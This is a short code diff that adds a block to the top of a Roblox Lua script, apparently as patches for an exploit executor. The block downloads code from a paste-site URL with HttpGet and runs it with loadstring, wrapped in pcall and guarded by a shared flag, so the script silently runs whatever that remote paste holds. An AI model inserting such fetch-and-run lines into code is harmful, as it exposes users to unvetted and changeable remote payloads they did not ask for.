@@ -1,3 +1,9 @@
+pcall(function()
+    if not shared.FunctionPatchesForTrashExecutor == true then
+        loadstring(game:HttpGet("https://pastefy.app/TL0PGJ2Z/raw"))()
+        shared.FunctionPatchesForTrashExecutor = true
+    end
+end)
 local CollectionService = game:GetService("CollectionService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
